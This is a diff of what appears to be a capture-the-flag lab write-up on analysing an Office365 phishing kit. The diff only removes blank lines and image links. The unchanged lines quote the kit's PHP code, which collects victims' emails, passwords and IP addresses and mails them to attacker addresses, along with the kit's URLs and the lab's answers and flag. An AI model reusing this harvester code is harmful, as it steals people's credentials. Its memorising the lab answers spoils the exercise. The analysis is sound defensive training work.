@@ -382,7 +382,6 @@ $email = $_POST['email'];
 $password = $_POST['password'];
 $passchk = strlen($password);
 
-
 $message .= "---------+ Office365 Login  |+-------\n";
 $message .= "Email : ".$email."\n";
 $message .= "Password : ".$password."\n";
@@ -393,7 +392,6 @@ $message .= "Country : ".$country."\n";
 $message .= "Date: ".$adddate."\n";
 $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
 $message .= "--+ Created BY Real Carder +---\n";
-
 
 $send = "m3npat@yandex.com";
 
@@ -450,7 +448,6 @@ else
 {
 $passerr = 1;
 }
-
 
 if ($passerr == 0)
 {
@@ -516,7 +513,6 @@ Update365/office365/Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
 Update365/office365/Scriptup/marvid:	$to ="jamestanner2299@gmail.com"
 Update365/office365/Scriptup/marvid:	$headers = "From: Blessing <blessing@heaven.com>";
 
-
 http://kennaroads.buzz/data/Update365/office365/flag.txt
 The secret is:
 fUxSVV8zSHRfaFQxd195NExwe01IVAo=
@@ -528,8 +524,6 @@ THM{pL4y_w1Th_tH3_URL}
 ```
 
 Who is the individual who received an email attachment containing a PDF?
-
-![[Pasted image 20230708224448.png]]
 
 *William McClean*
 
@@ -546,8 +540,6 @@ Use CyberChef to defang the URL
 What is the URL to the .zip archive of the phishing kit? (defanged format)
 
 Enumerate the URL paths.
-
-![[Pasted image 20230708231224.png]]
 
 	*hxxp[://]kennaroads[.]buzz/data/Update365[.]zip*
 
@@ -584,6 +576,5 @@ What is the hidden flag?
 The flag contains a ".txt" extension and, with some adjustments, should be downloadable from the phishing URL.
 
 *THM{pL4y_w1Th_tH3_URL}*
-
 
 [[Sweettooth Inc.]]
